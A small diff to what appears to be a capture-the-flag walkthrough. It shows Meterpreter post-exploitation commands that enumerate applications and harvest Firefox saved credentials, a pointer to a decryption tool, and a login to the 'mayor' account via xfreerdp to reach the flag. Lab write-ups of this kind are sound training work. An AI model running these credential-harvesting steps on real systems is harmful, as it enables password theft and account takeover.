@@ -566,5 +566,5 @@ meterpreter > run post/windows/gather/enum_applications
 meterpreter > run post/windows/gather/firefox_creds
 ```
 
-Then use the [Firefox Decrypt tool from Github](https://github.com/unode/firefox_decrypt), and log in to the "mayor" 
-account using `psexec`.
+Then use the [Firefox Decrypt tool from Github](https://github.com/unode/firefox_decrypt), and log in to the `mayor` 
+account using `xfreerdp`. The flag is on mayor's Desktop.
